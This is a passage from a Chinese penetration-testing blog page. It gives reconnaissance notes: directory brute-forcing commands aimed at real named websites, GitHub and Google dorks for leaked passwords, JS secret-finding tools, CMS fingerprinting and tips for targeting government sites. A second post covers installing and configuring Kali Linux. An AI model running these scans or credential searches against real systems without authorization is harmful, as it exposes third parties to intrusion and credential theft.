<p><a target="_blank" rel="noopener" href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a><br>单个目标<br>python3 dirmap.py -i <a target="_blank" rel="noopener" href="https://target.com">https://target.com</a> -lcf<br>多个目标<br>python3 dirmap.py -iF urls.txt -lcf</p>
<h3 id="7-5-dirsearch-kali"><a href="#7-5-dirsearch-kali" class="headerlink" title="7.5 dirsearch   (kali)"></a>7.5 dirsearch   (kali)</h3><p><a target="_blank" rel="noopener" href="https://gitee.com/Abaomianguan/dirsearch.git">https://gitee.com/Abaomianguan/dirsearch.git</a><br>unzip dirsearch.zip<br>python3 dirsearch.py -u <a target="_blank" rel="noopener" href="http://m.scabjd.com/">http://m.scabjd.com/</a> -e * </p>
<h3 id="7-6-dirbuster"><a href="#7-6-dirbuster" class="headerlink" title="7.6 dirbuster"></a>7.6 dirbuster</h3><h3 id="7-7-gobuster"><a href="#7-7-gobuster" class="headerlink" title="7.7 gobuster"></a>7.7 gobuster</h3><p>sudo apt-get install gobuster<br>gobuster dir -u <a target="_blank" rel="noopener" href="https://www.servyou.com.cn/">https://www.servyou.com.cn/</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50</p>
<p>dir -u 网址 w字典 -x 指定后缀 -t 线程数量<br>dir -u <a target="_blank" rel="noopener" href="https://www.servyou.com.cn/">https://www.servyou.com.cn/</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x “php,html,rar,zip” -d —wildcard -o servyou.log | grep ^”3402”</p>
<h3 id="7-8-网站文件"><a href="#7-8-网站文件" class="headerlink" title="7.8 网站文件"></a>7.8 网站文件</h3><ol>
<li>robots.txt</li>
<li>crossdomin.xml</li>
<li>sitemap.xml</li>
<li>后台目录</li>
<li>网站安装包</li>
<li>网站上传目录</li>
<li>mysql管理页面</li>
<li>phpinfo</li>
<li>网站文本编辑器</li>
<li>测试文件</li>
<li>网站备份文件(.rar、zip、.7z、.tar.gz、.bak)</li>
<li>DS_Store 文件</li>
<li>vim编辑器备份文件(.swp)</li>
<li>WEB—INF/web.xml文件</li>
<li>git</li>
<li>svn<br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/55286.html">https://www.secpulse.com/archives/55286.html</a></li>
</ol>
<h3 id="8-扫描网页备份"><a href="#8-扫描网页备份" class="headerlink" title="8.扫描网页备份"></a>8.扫描网页备份</h3><p>例如<br>config.php<br>config.php~<br>config.php.bak<br>config.php.swp<br>config.php.rar<br>conig.php.tar.gz</p>
<h3 id="9-网站头信息收集"><a href="#9-网站头信息收集" class="headerlink" title="9. 网站头信息收集"></a>9. 网站头信息收集</h3><p>1.中间件 ：web服务【Web Servers】 apache iis7 iis7.5 iis8 nginx WebLogic tomcat<br>2.网站组件： js组件jquery、vue  页面的布局bootstrap</p>
<p>通过浏览器获取<br><a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
<p>火狐的插件Wappalyzer</p>
<p>cmd 查询<br>curl 命令查询头信息<br>curl <a target="_blank" rel="noopener" href="https://www.????.com">https://www.????.com</a> -i</p>
<h2 id="10-敏感文件搜索"><a href="#10-敏感文件搜索" class="headerlink" title="10. 敏感文件搜索"></a>10. 敏感文件搜索</h2><h3 id="10-1-GitHub搜索"><a href="#10-1-GitHub搜索" class="headerlink" title="10.1 GitHub搜索"></a>10.1 GitHub搜索</h3><p>in:name test #仓库标题搜索含有关键字test<br>in:descripton test #仓库描述搜索含有关键字<br>in:readme test #Readme文件搜素含有关键字<br>搜索某些系统的密码<br><a target="_blank" rel="noopener" href="https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code">https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code</a><br>github 关键词监控<br><a target="_blank" rel="noopener" href="https://www.codercto.com/a/46640.html">https://www.codercto.com/a/46640.html</a></p>
<p>谷歌搜索<br>site:Github.com sa password<br>site:Github.com root password<br>site:Github.com User ID=’sa’;Password<br>site:Github.com inurl:sql<br>SVN 信息收集<br>site:Github.com svn<br>site:Github.com svn username<br>site:Github.com svn password<br>site:Github.com svn username password<br>综合信息收集<br>site:Github.com password<br>site:Github.com ftp ftppassword<br>site:Github.com 密码<br>site:Github.com 内部<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_36119192/article/details/99690742</span><br><span class="line">http://www.361way.com/github-hack/6284.html</span><br><span class="line">https://docs.github.com/cn/github/searching-for-information-on-github/searching-code</span><br><span class="line">https://github.com/search?q=smtp+bilibili.com&amp;type=code</span><br></pre></td></tr></table></figure></p>
<h3 id="10-2-Google-hacking"><a href="#10-2-Google-hacking" class="headerlink" title="10.2 Google-hacking"></a>10.2 Google-hacking</h3><p>site:域名<br>inurl: url中存在的关键字网页<br>intext：网页正文中的关键词<br>filetype:指定文件类型</p>
<h3 id="10-3-wooyun漏洞库"><a href="#10-3-wooyun漏洞库" class="headerlink" title="10.3 wooyun漏洞库"></a>10.3 wooyun漏洞库</h3><p><a target="_blank" rel="noopener" href="https://wooyun.website/">https://wooyun.website/</a> <a target="_blank" rel="noopener" href="https://wooyun.website/">wooyun</a></p>
<h3 id="10-4-网盘搜索"><a href="#10-4-网盘搜索" class="headerlink" title="10.4 网盘搜索"></a>10.4 网盘搜索</h3><p>凌云搜索: <a target="_blank" rel="noopener" href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a>      <a target="_blank" rel="noopener" href="https://www.lingfengyun.com/">凌云搜索</a><br>盘多多：<a target="_blank" rel="noopener" href="http://www.panduoduo.net/">http://www.panduoduo.net/</a>           <a target="_blank" rel="noopener" href="http://www.panduoduo.net/">盘多多</a><br>盘搜搜：<a target="_blank" rel="noopener" href="http://www.pansoso.com/">http://www.pansoso.com/</a>             <a target="_blank" rel="noopener" href="http://www.pansoso.com/">盘搜搜</a><br>盘搜：<a target="_blank" rel="noopener" href="http://www.pansou.com/">http://www.pansou.com/</a>                <a target="_blank" rel="noopener" href="http://www.pansou.com/">盘搜</a></p>
<h3 id="10-5-网站注册信息"><a href="#10-5-网站注册信息" class="headerlink" title="10.5 网站注册信息"></a>10.5 网站注册信息</h3><p>www.reg007.com      <a href="www.reg007.com">网站查询注册信息</a></p>
<h3 id="10-6-js敏感信息"><a href="#10-6-js敏感信息" class="headerlink" title="10.6 js敏感信息"></a>10.6 js敏感信息</h3><ol>
<li>网站的url连接写到js里面</li>
<li>js的api接口 里面包含用户信息 <del>比如 账号和密码</del><h4 id="10-6-1-jsfinder"><a href="#10-6-1-jsfinder" class="headerlink" title="10.6.1 jsfinder"></a>10.6.1 jsfinder</h4><a target="_blank" rel="noopener" href="https://gitee.com/kn1fes/JSFinder">https://gitee.com/kn1fes/JSFinder</a><br>python3 JSFinder.py -u <a target="_blank" rel="noopener" href="http://www.mi.com">http://www.mi.com</a><br>python3 JSFinder.py -u <a target="_blank" rel="noopener" href="http://www.mi.com">http://www.mi.com</a> -d<br>python3 JSFinder.py -u <a target="_blank" rel="noopener" href="http://www.mi.com">http://www.mi.com</a> -d -ou mi_url.txt -os mi_subdomain.txt<br>当你想获取更多信息的时候，可以使用-d进行深度爬取来获得更多内容，并使用命令 -ou, -os来指定URL和子域名所保存的文件名<br>批量指定URL和JS链接来获取里面的URL。<br>指定URL：<br>python JSFinder.py -f text.txt</li>
</ol>
<p>指定JS：<br>python JSFinder.py -f text.txt -j</p>
<h4 id="10-6-2-Packer-Fuzzer"><a href="#10-6-2-Packer-Fuzzer" class="headerlink" title="10.6.2    Packer-Fuzzer"></a>10.6.2    Packer-Fuzzer</h4><p>寻找网站交互接口 授权key<br>随着WEB前端打包工具的流行，您在日常渗透测试、安全服务中是否遇到越来越多以Webpack打包器为代表的网站？这类打包器会将整站的API和API参数打包在一起供Web集中调用，这也便于我们快速发现网站的功能和API清单，但往往这些打包器所生成的JS文件数量异常之多并且总JS代码量异常庞大（多达上万行），这给我们的手工测试带来了极大的不便，Packer Fuzzer软件应运而生。</p>
<p>本工具支持自动模糊提取对应目标站点的API以及API对应的参数内容，并支持对：未授权访问、敏感信息泄露、CORS、SQL注入、水平越权、弱口令、任意文件上传七大漏洞进行模糊高效的快速检测。在扫描结束之后，本工具还支持自动生成扫描报告，您可以选择便于分析的HTML版本以及较为正规的doc、pdf、txt版本。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nodejs &amp;&amp; sudo apt-get install npm</span><br><span class="line">git clone https://gitee.com/keyboxdzd/Packer-Fuzzer.git</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 PackerFuzzer.py -u https://www.liaoxuefeng.com  </span><br></pre></td></tr></table></figure></p>
<h4 id="10-6-3-SecretFinder"><a href="#10-6-3-SecretFinder" class="headerlink" title="10.6.3 SecretFinder"></a>10.6.3 SecretFinder</h4><p>一款基于Python脚本的JavaScript敏感信息搜索工具<br><a target="_blank" rel="noopener" href="https://gitee.com/mucn/SecretFinder">https://gitee.com/mucn/SecretFinder</a><br>python3 SecretFinder.py -i <a target="_blank" rel="noopener" href="https://www.moonsec.com/">https://www.moonsec.com/</a> -e</p>
<h2 id="11-cms识别-指纹识别"><a href="#11-cms识别-指纹识别" class="headerlink" title="11. cms识别/指纹识别"></a>11. cms识别/指纹识别</h2><p>收集好网站信息之后，应该对网站进行指纹识别，通过识别指纹，确定目标的cms及版本，方便制定下一步的测试计划，可以用公开的poc或自己累积的对应手法等进行正式的渗透测试。</p>
<h3 id="11-1-云悉"><a href="#11-1-云悉" class="headerlink" title="11.1 云悉"></a>11.1 云悉</h3><p><a target="_blank" rel="noopener" href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a>    <a target="_blank" rel="noopener" href="http://www.yunsee.cn/info.html">云悉</a></p>
<h3 id="11-2-潮汐指纹"><a href="#11-2-潮汐指纹" class="headerlink" title="11.2 潮汐指纹"></a>11.2 潮汐指纹</h3><p><a target="_blank" rel="noopener" href="http://finger.tidesec.net/">http://finger.tidesec.net/</a>        <a target="_blank" rel="noopener" href="http://finger.tidesec.net/">潮汐指纹</a></p>
<h3 id="11-3-CMS指纹识别"><a href="#11-3-CMS指纹识别" class="headerlink" title="11.3 CMS指纹识别"></a>11.3 CMS指纹识别</h3><p><a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br><a target="_blank" rel="noopener" href="https://github.com/search?q=cms">https://github.com/search?q=cms</a></p>
<h3 id="11-4-whatcms-kali"><a href="#11-4-whatcms-kali" class="headerlink" title="11.4 whatcms    (kali)"></a>11.4 whatcms    (kali)</h3><h3 id="11-5-御剑cms识别"><a href="#11-5-御剑cms识别" class="headerlink" title="11.5 御剑cms识别"></a>11.5 御剑cms识别</h3><p><a target="_blank" rel="noopener" href="https://github.com/ldbfpiaoran/cmscan">https://github.com/ldbfpiaoran/cmscan</a><br><a target="_blank" rel="noopener" href="https://github.com/theLSA/cmsIdentification/">https://github.com/theLSA/cmsIdentification/</a></p>
<h2 id="12-非常规按操作"><a href="#12-非常规按操作" class="headerlink" title="12. 非常规按操作"></a>12. 非常规按操作</h2><p>1、如果找到了目标的一处资产，但是对目标其他资产的收集无处下手时，可以查看一下该站点的body里是否有目标的特征，然后利用网络空间搜索引擎（如fofa等）对该特征进行搜索，如：body=”XX公司”或body=”baidu”等。</p>
<p>该方式一般适用于特征明显，资产数量较多的目标，并且很多时候效果拔群。</p>
<p>2、当通过上述方式的找到test.com的特征后，再进行body的搜索，然后再搜索到test.com的时候，此时fofa上显示的ip大概率为test.com的真实IP。</p>
<p>3、如果需要对政府网站作为目标，那么在批量获取网站首页的时候，可以用上<br><a target="_blank" rel="noopener" href="http://114.55.181.28/databaseInfo/index">http://114.55.181.28/databaseInfo/index</a><br>之后可以结合上一步的方法进行进一步的信息收集。</p>
<h2 id="13-SSL-TLS证书查询"><a href="#13-SSL-TLS证书查询" class="headerlink" title="13. SSL/TLS证书查询"></a>13. SSL/TLS证书查询</h2><p>SSL/TLS证书通常包含域名、子域名和邮件地址等信息，结合证书中的信息，可以更快速地定位到目标资产，获取到更多目标资产的相关信息。<br><a target="_blank" rel="noopener" href="https://myssl.com/">https://myssl.com/</a><br><a target="_blank" rel="noopener" href="https://crt.sh">https://crt.sh</a><br><a target="_blank" rel="noopener" href="https://censys.io">https://censys.io</a><br><a target="_blank" rel="noopener" href="https://developers.facebook.com/tools/ct/">https://developers.facebook.com/tools/ct/</a><br><a target="_blank" rel="noopener" href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a></p>
<p>SSL证书搜索引擎：<br><a target="_blank" rel="noopener" href="https://certdb.com/domain/github.com">https://certdb.com/domain/github.com</a><br><a target="_blank" rel="noopener" href="https://crt.sh/?Identity=%.???.com">https://crt.sh/?Identity=%.???.com</a><br><a target="_blank" rel="noopener" href="https://censys.io/">https://censys.io/</a><br>GetDomainsBySSL.py</p>
<h2 id="14-查找厂商ip段"><a href="#14-查找厂商ip段" class="headerlink" title="14. 查找厂商ip段"></a>14. 查找厂商ip段</h2><p><a target="_blank" rel="noopener" href="http://ipwhois.cnnic.net.cn/index.jsp">http://ipwhois.cnnic.net.cn/index.jsp</a></p>
<h2 id="15-移动资产收集"><a href="#15-移动资产收集" class="headerlink" title="15. 移动资产收集"></a>15. 移动资产收集</h2><h3 id="15-1-微信小程序支付宝小程序"><a href="#15-1-微信小程序支付宝小程序" class="headerlink" title="15.1 微信小程序支付宝小程序"></a>15.1 微信小程序支付宝小程序</h3><p><a target="_blank" rel="noopener" href="https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E6%8B%BC%E5%A4%9A%E5%A4%9A">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E6%8B%BC%E5%A4%9A%E5%A4%9A</a></p>
<h3 id="15-2-app软件搜索"><a href="#15-2-app软件搜索" class="headerlink" title="15.2 app软件搜索"></a>15.2 app软件搜索</h3><p><a target="_blank" rel="noopener" href="https://www.qimai.cn/">https://www.qimai.cn/</a></p>
<h2 id="16-js敏感文件"><a href="#16-js敏感文件" class="headerlink" title="16. js敏感文件"></a>16. js敏感文件</h2><p><a target="_blank" rel="noopener" href="https://github.com/m4ll0k/SecretFinder">https://github.com/m4ll0k/SecretFinder</a><br><a target="_blank" rel="noopener" href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a><br><a target="_blank" rel="noopener" href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p>
<h2 id="17-github信息泄露监控"><a href="#17-github信息泄露监控" class="headerlink" title="17. github信息泄露监控"></a>17. github信息泄露监控</h2><p><a target="_blank" rel="noopener" href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a><br><a target="_blank" rel="noopener" href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a><br><a target="_blank" rel="noopener" href="https://github.com/VKSRC/Github-Monitor">https://github.com/VKSRC/Github-Monitor</a></p>
<h2 id="18-资产收集神器"><a href="#18-资产收集神器" class="headerlink" title="18. 资产收集神器"></a>18. 资产收集神器</h2><p>ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统<br><a target="_blank" rel="noopener" href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p>
<p>AssetsHunter<br><a target="_blank" rel="noopener" href="https://github.com/rabbitmask/AssetsHunter">https://github.com/rabbitmask/AssetsHunter</a></p>
<p>一款用于src资产信息收集的工具<br><a target="_blank" rel="noopener" href="https://github.com/sp4rkw/Reaper">https://github.com/sp4rkw/Reaper</a></p>
<p>domain_hunter_pro<br><a target="_blank" rel="noopener" href="https://github.com/bit4woo/domain_hunter_pro">https://github.com/bit4woo/domain_hunter_pro</a></p>
<p>LangSrcCurise<br><a target="_blank" rel="noopener" href="https://github.com/shellsec/LangSrcCurise">https://github.com/shellsec/LangSrcCurise</a></p>
<p>网段资产<br><a target="_blank" rel="noopener" href="https://github.com/colodoo/midscan">https://github.com/colodoo/midscan</a></p>
<h2 id="19-工具"><a href="#19-工具" class="headerlink" title="19. 工具"></a>19. 工具</h2><p>Fuzz字典推荐：<a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a><br>BurpCollector(BurpSuite参数收集插件)：<a target="_blank" rel="noopener" href="https://github.com/TEag1e/BurpCollector">https://github.com/TEag1e/BurpCollector</a><br>Wfuzz：<a target="_blank" rel="noopener" href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a><br>LinkFinder：<a target="_blank" rel="noopener" href="https://github.com/GerbenJavado/LinkFinder">https://github.com/GerbenJavado/LinkFinder</a><br>PoCBox：<a target="_blank" rel="noopener" href="https://github.com/Acmesec/PoCBox">https://github.com/Acmesec/PoCBox</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2021/09/15/kali%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/15/kali%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">kali安装与使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2021-09-15 23:21:34" itemprop="dateCreated datePublished" datetime="2021-09-15T23:21:34+08:00">2021-09-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
                <time title="عُدل: 2024-04-28 09:42:25" itemprop="dateModified" datetime="2024-04-28T09:42:25+08:00">2024-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">في</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kali安装与使用"><a href="#kali安装与使用" class="headerlink" title="kali安装与使用"></a>kali安装与使用</h1><h2 id="1-简单介绍"><a href="#1-简单介绍" class="headerlink" title="1.    简单介绍"></a>1.    简单介绍</h2><p>Kali Linux是基于Debian的Linux发行版， 设计用于数字取证操作系统。每一季度更新一次。由Offensive Security Ltd维护和资助。最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackTrack来完成，BackTrack是他们之前写的用于取证的Linux发行版 。<br>Kali Linux预装了许多渗透测试软件，包括nmap 、Wireshark 、John the Ripper，以及Aircrack-ng. 用户可通过硬盘、live CD或live USB运行Kali Linux。Kali Linux既有32位和64位的镜像。可用于x86 指令集。同时还有基于ARM架构的镜像，可用于树莓派和三星的ARM Chromebook</p>
<h2 id="2-Kali的版本"><a href="#2-Kali的版本" class="headerlink" title="2.    Kali的版本"></a>2.    Kali的版本</h2><p>根据系统的不同选择不同的版本。主要分为32/64版本 通常用64居多<br>同时也提供多个安装版本 直接安装的版本、虚拟机版本 （wmare /vbox）<br>安装版本<br><a target="_blank" rel="noopener" href="https://www.kali.org/downloads/">https://www.kali.org/downloads/</a></p>
<p>账号和密码都是kali</p>
<h2 id="3-配置"><a href="#3-配置" class="headerlink" title="3.    配置"></a>3.    配置</h2><h3 id="3-1-安装虚拟机open-vm-tools-desktop模块"><a href="#3-1-安装虚拟机open-vm-tools-desktop模块" class="headerlink" title="3.1.    安装虚拟机open-vm-tools-desktop模块"></a>3.1.    安装虚拟机open-vm-tools-desktop模块</h3><p>sudo apt-get install open-vm-tools-desktop</p>
<h3 id="3-2-设置中文"><a href="#3-2-设置中文" class="headerlink" title="3.2.    设置中文"></a>3.2.    设置中文</h3><p>sudo apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy<br>sudo dpkg-reconfigure locales<br>选择字符 zh_CN.UTF-8<br><img src="/image/中文设置.png" alt="中文设置"><br>重启 reboot</p>
<h3 id="3-3-安装python3的pip"><a href="#3-3-安装python3的pip" class="headerlink" title="3.3.    安装python3的pip"></a>3.3.    安装python3的pip</h3><p>sudo apt-get install python3-pip<br>解决pip3 超时下载<br>python3的pip3默认源太慢，所以我们为了提升使用效果，通常选择国内源。<br>其实方法很简单，脚本如下：<br>mkdir -p ~/.pip<br>vim ~/.pip/pip.conf<br>然后将下列的内容写入~/.pip/pip.conf即可。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = http://pypi.douban.com/simple</span><br><span class="line">[install]</span><br><span class="line">trusted-host=pypi.douban.com</span><br></pre></td></tr></table></figure><br>我这里使用了豆瓣的源，只是使用习惯问题，当然我们也可以使用清华等其他国内源。</p>
<p><em>国内其他pip源</em><br>清华：<a target="_blank" rel="noopener" href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a><br>中国科技大学<a target="_blank" rel="noopener" href="https://pypi.mirrors.ustc.edu.cn/simple/">https://pypi.mirrors.ustc.edu.cn/simple/</a><br>华中理工大学：<a target="_blank" rel="noopener" href="http://pypi.hustunique.com/">http://pypi.hustunique.com/</a><br>山东理工大学：<a target="_blank" rel="noopener" href="http://pypi.sdutlinux.org/">http://pypi.sdutlinux.org/</a><br>豆瓣：<a target="_blank" rel="noopener" href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></p>
<h3 id="3-4-更新源"><a href="#3-4-更新源" class="headerlink" title="3.4.    更新源"></a>3.4.    更新源</h3><p>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak<br>sudo vim /etc/apt/sources.list</p>
<h1 id="阿里云"><a href="#阿里云" class="headerlink" title="阿里云"></a>阿里云</h1><p>deb <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>deb-src <a target="_blank" rel="noopener" href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>
<h1 id="清华大学"><a href="#清华大学" class="headerlink" title="清华大学"></a>清华大学</h1><p>deb <a target="_blank" rel="noopener" href="http://mirrors.tuna.tsinghua.edu.cn/kali">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/kali">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free</p>
<h1 id="浙大"><a href="#浙大" class="headerlink" title="浙大"></a>浙大</h1><p>deb <a target="_blank" rel="noopener" href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a target="_blank" rel="noopener" href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free</p>
<p>apt-get update 更新系统<br>apt-get upgrade 升级已安装的所有软件包<br>apt-get dist-upgrade 升级软件 会自动处理依赖包</p>
<p><em>vim 编辑器</em><br>sudo 使用特权 root权限<br>:wq 保存</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="الصفحة السابقة"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="الصفحة التالية"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          المحتويات
        </li>
        <li class="sidebar-nav-overview">
          عام
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Mortal</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">المقالات</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">التصنيفات</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">الوسوم</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/AllofMortal" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;AllofMortal" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://steamcommunity.com/id/AllofMortal" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;AllofMortal" rel="noopener" target="_blank"><i class="fab fa-steam fa-fw"></i>Steam</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2026</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Mortal</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
